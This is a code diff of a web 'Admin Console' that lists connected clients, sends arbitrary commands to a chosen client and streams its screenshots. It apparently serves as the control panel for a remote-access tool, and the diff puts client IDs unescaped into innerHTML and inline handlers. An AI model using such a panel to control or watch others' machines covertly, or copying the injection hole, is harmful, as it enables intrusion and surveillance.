@@ -6,30 +6,32 @@
   <title>Admin Console</title>
   <style>
     body { font-family: sans-serif; padding: 20px; }
-    h1 { color: #333; }
-    input { padding: 5px; margin-right: 5px; }
-    button { padding: 5px 10px; }
     pre { background: #eee; padding: 10px; max-height: 300px; overflow: auto; }
-    ul { list-style-type: none; padding: 0; }
-    li { background: #f9f9f9; margin: 2px 0; padding: 5px; }
+    img { max-width: 400px; border: 1px solid #ccc; }
   </style>
 </head>
 <body>
   <h1>Admin Console</h1>
 
-  <h2>Connected Clients:</h2>
+  <h2>Clients:</h2>
   <ul id="client-list"></ul>
 
   <h2>Send Command:</h2>
-  <input type="text" id="command-input" placeholder="Enter command">
+  <input type="text" id="command-input">
   <button onclick="sendCommand()">Send</button>
+
+  <h2>Screen:</h2>
+  <button onclick="startScreen()">Start Screenshare</button>
+  <button onclick="stopScreen()">Stop Screenshare</button>
+  <div><img id="screen" /></div>
 
   <h2>Output:</h2>
   <pre id="output"></pre>
 
   <script>
-    const API_URL = "";
-    const WS_URL = "";
+    let selectedClient = null;
+    let ws = null;
+    let pollingScreen = false;
 
     function apiBase() {
       return window.location.origin;
@@ -39,42 +41,68 @@
       return (window.location.protocol === "https:" ? "wss://" : "ws://") + window.location.host;
     }
 
-    let ws = null;
-
     function loadClients() {
       fetch(apiBase() + "/clients")
-        .then(response => response.json())
+        .then(res => res.json())
         .then(data => {
           const list = document.getElementById("client-list");
           list.innerHTML = "";
           data.clients.forEach(c => {
             const li = document.createElement("li");
-            li.textContent = c;
+            li.innerHTML = `${c} <button onclick="selectClient('${c}')">Select</button>`;
             list.appendChild(li);
           });
         });
     }
 
-    function initWebSocket() {
+    function selectClient(clientId) {
+      selectedClient = clientId;
+      document.getElementById("output").textContent = "";
+      document.getElementById("screen").src = "";
+    }
+
+    function initWS() {
       ws = new WebSocket(wsBase() + "/ws/admin");
-      ws.onmessage = event => {
-        const out = document.getElementById("output");
-        out.textContent += event.data + "\n";
-        out.scrollTop = out.scrollHeight;
+      ws.onmessage = (e) => {
+        if (e.data.startsWith("__screen__")) {
+          const clientId = e.data.replace("__screen__", "");
+          if (clientId === selectedClient) {
+            fetch(apiBase() + "/screen/" + clientId)
+              .then(res => res.json())
+              .then(data => {
+                if (data.screen) {
+                  document.getElementById("screen").src = "data:image/png;base64," + data.screen;
+                }
+              });
+          }
+        } else {
+          document.getElementById("output").textContent += e.data + "\n";
+        }
       };
     }
 
     function sendCommand() {
-      const input = document.getElementById("command-input");
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(input.value);
-        input.value = "";
+      const input = document.getElementById("command-input").value;
+      if (selectedClient && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ target: selectedClient, cmd: input }));
+      }
+    }
+
+    function startScreen() {
+      if (selectedClient && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_start" }));
+      }
+    }
+
+    function stopScreen() {
+      if (selectedClient && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_stop" }));
       }
     }
 
     loadClients();
     setInterval(loadClients, 5000);
-    initWebSocket();
+    initWS();
   </script>
 </body>
 </html>
